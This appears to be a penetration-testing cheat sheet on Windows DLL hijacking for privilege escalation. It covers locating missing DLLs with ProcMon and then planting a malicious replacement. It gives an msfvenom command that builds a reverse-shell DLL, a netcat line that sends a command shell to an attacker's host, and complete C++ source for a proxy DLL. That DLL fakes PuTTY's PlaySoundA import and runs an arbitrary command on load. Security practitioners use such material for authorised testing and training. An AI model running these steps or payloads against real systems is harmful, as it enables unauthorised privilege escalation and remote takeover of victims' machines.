# DLL Hijacking

## Theory

DLL is a shared library of dynamic links, containing classes, functions, resources, variables, all that kind of stuff. When Windows starts a service or application, it looks for DLLs. BUT, if the DLL does not exist, then we can try hijacking it.

## Verification

{% tabs %}
{% tab title="Blind" %}
To use DLL Hijacking for elevation of privileges, we will need to investigate an application and known vulnerabilities and DLLs and find a DLL that is not present on the system to which we have write access.

The following are the steps to perform DLL hijacking.

* Identify the vulnerable application and its location.
* Identify the PID of the application.
* Identify the vulnerable DLLs that can be hijacked, checking if they do not exist and if we have write permissions to the directory being searched.
* Use MSFVenom or other payload creation tools to create a malicious DLL.
* Replace the original DLL with the malicious DLL.
* Done.

To begin privilege escalation with DLL Hijacking, we need to identify an application and a scheduled task that we can attack. Once we have identified our target, we can use the power of Google to search for possible vulnerable DLLs associated with the application, since we cannot use tools like ProcMon to facilitate the process.

By searching Google, `<application> DLL Hijacking`, we can see several articles and blog posts that can guide us in the right direction and investigate the application for us.

If there is no research on the application available, say a proprietary application, you can try downloading the application from the server or find an identical copy on the Internet for download that will allow you to search for the vulnerable DLLs on your local machine.
{% endtab %}

{% tab title="Manual" %}
For this case, we are going to need a Windows system that works as an exploit development environment. After we have it, we will download the ProcMon and the binary with the same version:

```shell
https://download.sysinternals.com/files/ProcessMonitor.zip
```

{% hint style="warning" %}
Remember that we cannot use ProcMon.exe on the compromised machine as it requires administrator privileges.
{% endhint %}

We transfer the ProcMon.exe and the binary to test to our local machine to look for possible non-existent DLLs.

When running ProcMon.exe, we will add the following filters:

* Result - is - NAME NOT FOUND

![Result is NAME NOT FOUND](../../../../.gitbook/assets/result\_is\_name\_not\_found.png)

* Path - ends with - .dll

![Path ends with .dll](../../../../.gitbook/assets/path\_ends\_with\_dll.png)

From here, we have to start capturing with ProcMon.exe, start the binary to test, and then stop capturing. If there is a missing DLL, we can escalate privileges.
{% endtab %}
{% endtabs %}

## Privilege Escalation

{% tabs %}
{% tab title="msfvenom" %}
We create the malicious DLL:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll
```

We transfer the malicious DLL to the victim machine and then:

```shell
# The name must be the same as the DLL that the application/program is looking for:
copy C:\Windows\Temp\shell.dll <PATH TO DIRECTORY>/<NAME>.dll
```
{% endtab %}

{% tab title="C" %}
```
# Repo: https://github.com/sagishahar/scripts
https://raw.githubusercontent.com/sagishahar/scripts/master/windows_dll.c
```

![](../../../../.gitbook/assets/windows\_dll\_c.png)

```c
cmd /k C:\Windows\Temp\nc64.exe -e cmd <LHOST> <LPORT>
```

We cross-compiled the C code. You can see the process [here](../../../exploits/compiling-exploits.md#compilation-for-windows).
{% endtab %}

{% tab title="Stealthy" %}
{% hint style="info" %}
Example with the DLL WINMM.dll, from the binary PuTTY.exe
{% endhint %}

If we already know the non-existent DLL, we can see what functions it is importing:

```shell
# Visual Studio command prompt:
dumpbin /imports <PATH>/PuTTY.exe
```

![](../../../../.gitbook/assets/winmm\_dll\_import.png)

We see that WINMM.dll is using the PlaySoundA function. Therefore, we need to look to see if this function is documented. In this case, it is: [https://docs.microsoft.com/en-us/previous-versions/dd743680(v=vs.85)](https://docs.microsoft.com/en-us/previous-versions/dd743680\(v=vs.85\))

```cpp
BOOL PlaySound(
   LPCTSTR pszSound,
   HMODULE hmod,
   DWORD   fdwSound
);
```

At this point, we can create a malicious binary, where the aforementioned function is exported and in the DllMain(), inject a command.

```cpp
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
        CreateProcess(
	    "<COMMAND>", 
	    "", NULL, NULL, TRUE, 0, NULL, NULL, 
	    &info, &processInfo);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
    __declspec(dllexport) BOOL WINAPI PlaySoundA(
                                        LPCSTR pszSound,
					HMODULE hmod,
					DWORD fdwSound) {
        return TRUE;
    }
}
```

We compile it and that's it.
{% endtab %}
{% endtabs %}

And the last thing left is to stop and start the service/program or wait for the task to run some task and is looking for a DLL.
